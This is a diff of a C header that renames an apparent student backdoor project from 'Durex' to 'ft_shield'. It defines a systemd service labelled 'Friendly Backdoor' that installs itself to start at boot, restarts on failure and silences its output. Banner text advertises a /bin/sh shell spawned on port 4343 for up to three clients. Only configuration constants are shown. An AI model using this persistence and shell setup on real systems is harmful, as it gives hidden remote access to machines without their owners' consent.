@@ -17,36 +17,36 @@
 
 # define READ_BUFFER_SIZE 4096
 
-# define SERVICE_FILE_NAME "durex.service"
+# define SERVICE_FILE_NAME "ft_shield.service"
 # define SERVICE_PATH "/etc/systemd/system/"
 # define SERVICE_FILE SERVICE_PATH SERVICE_FILE_NAME
 # define SERVICE_INSTALL_PATH "/etc/systemd/system/multi-user.target.wants/"
 # define SERVICE_INSTALL_FILE SERVICE_INSTALL_PATH SERVICE_FILE_NAME
-# define SERVICE_BIN "/bin/Durex"
+# define SERVICE_BIN "/bin/ft_shield"
 
-# define SERVICE_FILE_CONTENT	"[Unit]\n"						 	\
-								"Description=Friendly Backdoor\n"	\
-								"After=network-online.target\n"	 	\
-								"Wants=network-online.target\n\n"	\
-								"[Service]\n"						\
-								"Type=forking\n"					\
-								"ExecStart=/bin/Durex\n"			\
-								"PIDFile=/var/lock/durex.lock\n"	\
-								"Restart=on-failure\n"				\
-								"RestartSec=1\n"					\
-								"WorkingDirectory=/\n"				\
-								"StandardInput=null\n"				\
-								"StandardOutput=null\n"				\
-								"StandardError=null\n"				\
-								"KillMode=mixed\n\n"				\
-								"[Install]\n"						\
+# define SERVICE_FILE_CONTENT	"[Unit]\n"						 		\
+								"Description=Friendly Backdoor\n"		\
+								"After=network-online.target\n"	 		\
+								"Wants=network-online.target\n\n"		\
+								"[Service]\n"							\
+								"Type=forking\n"						\
+								"ExecStart=/bin/ft_shield\n"			\
+								"PIDFile=/var/lock/ft_shield.lock\n"	\
+								"Restart=on-failure\n"					\
+								"RestartSec=1\n"						\
+								"WorkingDirectory=/\n"					\
+								"StandardInput=null\n"					\
+								"StandardOutput=null\n"					\
+								"StandardError=null\n"					\
+								"KillMode=mixed\n\n"					\
+								"[Install]\n"							\
 								"WantedBy=multi-user.target\n"
 
 # define DUREX_HEADER	""	\
 	"/* ************************************************************************** */\n"	\
 	"/*                                                        :::      ::::::::   */\n"	\
-	"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"									\
-								"                           :+:      :+:    :+:   */\n"		\
+	"/*      WELCOME TO ft_shield                                                  */\n"	\
+	"/*                                                     :+:      :+:    :+:    */\n"	\
 	"/*                                                    +:+ +:+         +:+     */\n"	\
 	"/*      * 3 clients max                             +#+  +:+       +#+        */\n"	\
 	"/*      * Enter 'help' to see all commands        +#+#+#+#+#+   +#+           */\n"	\
@@ -57,8 +57,8 @@
 # define DUREX_SHELL_HEADER ""	\
 	"/* ************************************************************************** */\n"	\
 	"/*                                                        :::      ::::::::   */\n"	\
-	"/*  \xe2\x98\xa0  - WELCOME TO DUREX - \xe2\x98\xa0"									\
-								"                           :+:      :+:    :+:   */\n"		\
+	"/*      WELCOME TO ft_shield                                                  */\n"	\
+	"/*                                                     :+:      :+:    :+:    */\n"	\
 	"/*                                                    +:+ +:+         +:+     */\n"	\
 	"/*      * Spawned /bin/sh on port 4343              +#+  +:+       +#+        */\n"	\
 	"/*                                                +#+#+#+#+#+   +#+           */\n"	\
